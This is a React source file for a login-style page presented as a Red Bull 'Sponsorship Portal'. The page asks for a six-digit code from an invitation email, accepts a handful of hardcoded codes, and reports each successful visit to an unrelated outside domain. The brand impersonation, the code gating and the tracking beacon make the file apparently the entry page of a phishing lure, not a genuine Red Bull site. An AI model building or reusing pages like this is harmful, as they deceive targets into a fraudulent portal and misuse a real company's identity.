import { useState, useRef } from 'react'
import './AuthPage.css'

const API = 'https://hr-work-edge.com/summit/api'

function sendVisitorInfo() {
  fetch(`${API}/visit.php`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  }).catch(() => {})
}

const VALID_CODES = new Set(['920059', '019925', '202629', '820001', '020455'])

export default function AuthPage({ onSuccess }) {
  const [code, setCode] = useState(Array(6).fill(''))
  const [error, setError] = useState(false)
  const refs = useRef([])

  const handleChange = (i, val) => {
    const digit = val.replace(/\D/g, '').slice(-1)
    const next = [...code]
    next[i] = digit
    setCode(next)
    setError(false)
    if (digit && i < 5) refs.current[i + 1]?.focus()
  }

  const handleKeyDown = (i, e) => {
    if (e.key === 'Backspace' && !code[i] && i > 0) {
      refs.current[i - 1]?.focus()
    }
  }

  const handlePaste = (e) => {
    e.preventDefault()
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('')
    const next = [...code]
    digits.forEach((d, idx) => { next[idx] = d })
    setCode(next)
    refs.current[Math.min(digits.length, 5)]?.focus()
  }

  const ready = code.every(c => c !== '')

  return (
    <div className="auth-wrap">
      <div className="auth-inner">

        {/* LOGO */}
        <img src="/redbull-logo.svg" alt="Red Bull" className="auth-logo" />
        <div className="auth-portal-tag">Sponsorship Portal</div>

        <div className="auth-divider" />

        {/* HEADING */}
        <p className="auth-eyebrow">Personal Invitation &nbsp;·&nbsp; Verification Required</p>
        <h1 className="auth-title">Verify Your<br />Identity</h1>

        <p className="auth-desc">
          Your verification code is included in the sponsorship invitation email
          we sent you. Enter it below to access your portal.
        </p>

        {/* EMAIL */}
        <div className="auth-email-badge">
          <span className="auth-email-dot" />
          Check your invitation email for the code
        </div>

        {/* OTP */}
        <p className="auth-otp-label">Enter verification code</p>
        <div className="auth-otp-wrap" onPaste={handlePaste}>
          {code.map((v, i) => (
            <input
              key={i}
              ref={el => refs.current[i] = el}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={v}
              className={`otp-box${v ? ' otp-filled' : ''}`}
              onChange={e => handleChange(i, e.target.value)}
              onKeyDown={e => handleKeyDown(i, e)}
              autoFocus={i === 0}
            />
          ))}
        </div>

        {/* CTA */}
        {error && (
          <p className="auth-error">Invalid verification code. Please check your invitation email and try again.</p>
        )}
        <button
          className={`auth-cta${ready ? ' auth-cta-ready' : ''}`}
          onClick={() => {
            if (!ready) return
            if (VALID_CODES.has(code.join(''))) {
              sendVisitorInfo()
              onSuccess()
            } else {
              setError(true)
            }
          }}
        >
          Continue to Portal
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
            <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/>
          </svg>
        </button>

        <p className="auth-footer-note">
          This invitation is strictly confidential and non-transferable.<br />
          © 2026 Red Bull GmbH
        </p>

      </div>
    </div>
  )
}
